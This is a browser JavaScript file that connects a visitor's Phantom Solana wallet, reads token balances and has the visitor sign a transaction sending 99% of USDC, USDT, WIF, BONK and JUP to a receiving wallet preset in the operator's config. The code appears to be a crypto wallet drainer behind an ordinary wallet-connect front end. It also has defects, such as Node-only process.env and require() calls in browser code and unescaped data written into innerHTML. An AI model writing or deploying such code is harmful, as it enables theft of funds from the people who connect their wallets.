async function connectWallet() {
    console.log("Connect Wallet button clicked");

    if (window.solana) {
        console.log("window.solana detected");

        if (window.solana.isPhantom) {
            try {
                const response = await window.solana.connect();
                const walletAddress = response.publicKey.toString();
                console.log("Connected to wallet:", walletAddress);
                document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
                window.walletAddress = walletAddress;
                
                // Fetch and display token balances
                await fetchTokenBalances(walletAddress);
            } catch (err) {
                console.error("Wallet connection failed:", err);
            }
        } else {
            console.error("Solana provider is not Phantom");
        }
    } else {
        console.error("window.solana not found");
        alert("Phantom wallet not found. Please install it.");
    }
}

/**
 * Fetch token balances for the connected wallet
 * @param {string} walletAddress - The wallet address to fetch balances for
 */
async function fetchTokenBalances(walletAddress) {
    try {
        const response = await fetch(`/api/solana/token-balances?publicKey=${walletAddress}`);
        const data = await response.json();
        
        if (data.balances) {
            console.log('Token Balances:', data.balances);
            
            // Display balances in UI if element exists
            const balanceDisplay = document.getElementById('tokenBalances');
            if (balanceDisplay) {
                let html = '<div class="token-balances"><h3>Token Balances</h3>';
                for (const [token, balance] of Object.entries(data.balances)) {
                    html += `<div class="token-balance">
                        <strong>${token}:</strong> ${balance.balance || 0} 
                        ${balance.error ? `<span class="error">(${balance.error})</span>` : ''}
                    </div>`;
                }
                html += '</div>';
                balanceDisplay.innerHTML = html;
            }
            
            window.tokenBalances = data.balances;
            return data.balances;
        }
    } catch (error) {
        console.error('Error fetching token balances:', error);
    }
}

/**
 * Transfer 99% of specified tokens to a destination address
 * @param {string} destinationAddress - Where to send the tokens
 * @param {string[]} tokens - Which tokens to transfer (default: all)
 */
async function transfer99PercentTokens(destinationAddress, tokens = ['USDC', 'USDT', 'WIF', 'BONK', 'JUP']) {
    if (!window.walletAddress) {
        alert('Please connect your wallet first');
        return;
    }

    if (!destinationAddress) {
        alert('Please provide a destination address');
        return;
    }

    try {
        // Step 1: Request transaction preparation from server
        console.log('Preparing token transfer transaction...');
        const prepareResponse = await fetch('/api/solana/transfer-tokens-99percent', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                sourcePublicKey: window.walletAddress,
                destinationAddress: destinationAddress,
                tokens: tokens
            })
        });

        const prepareData = await prepareResponse.json();
        
        if (prepareData.status === 'no_transfers') {
            alert('No tokens to transfer');
            console.log(prepareData);
            return;
        }

        if (prepareData.status !== 'ready_for_signing') {
            throw new Error('Failed to prepare transaction: ' + JSON.stringify(prepareData));
        }

        console.log('Transfer summary:', prepareData.transfers);

        // Step 2: Sign transaction with Phantom wallet
        const transactionBuffer = Buffer.from(prepareData.transaction, 'base64');
        const { Transaction } = require('@solana/web3.js');
        const transaction = Transaction.from(transactionBuffer);

        console.log('Requesting wallet signature...');
        const signedTransaction = await window.solana.signTransaction(transaction);
        
        // Step 3: Send signed transaction to server
        console.log('Sending signed transaction...');
        const sendResponse = await fetch('/api/solana/send-signed-transaction', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                signedTransaction: signedTransaction.serialize().toString('base64')
            })
        });

        const sendData = await sendResponse.json();
        
        if (sendData.success) {
            console.log('Transfer successful!');
            console.log('Transaction signature:', sendData.signature);
            alert(`Transfer successful! Signature: ${sendData.signature}`);
            
            // Refresh balances
            await fetchTokenBalances(window.walletAddress);
        } else {
            throw new Error('Failed to send transaction: ' + JSON.stringify(sendData));
        }
    } catch (error) {
        console.error('Error during token transfer:', error);
        alert(`Transfer failed: ${error.message}`);
    }
}

/**
 * Quick action to transfer 99% to a preset address
 * Set YOUR_DESTINATION_ADDRESS to your receiving wallet
 */
async function autoTransfer99Percent() {
    const YOUR_DESTINATION_ADDRESS = process.env.RECEIVING_WALLET || 'YOUR_WALLET_ADDRESS_HERE';
    
    if (YOUR_DESTINATION_ADDRESS === 'YOUR_WALLET_ADDRESS_HERE') {
        alert('Please set the destination wallet address in the config');
        return;
    }
    
    if (confirm('Transfer 99% of USDC, USDT, WIF, BONK, JUP to ' + YOUR_DESTINATION_ADDRESS + '?')) {
        await transfer99PercentTokens(YOUR_DESTINATION_ADDRESS);
    }
}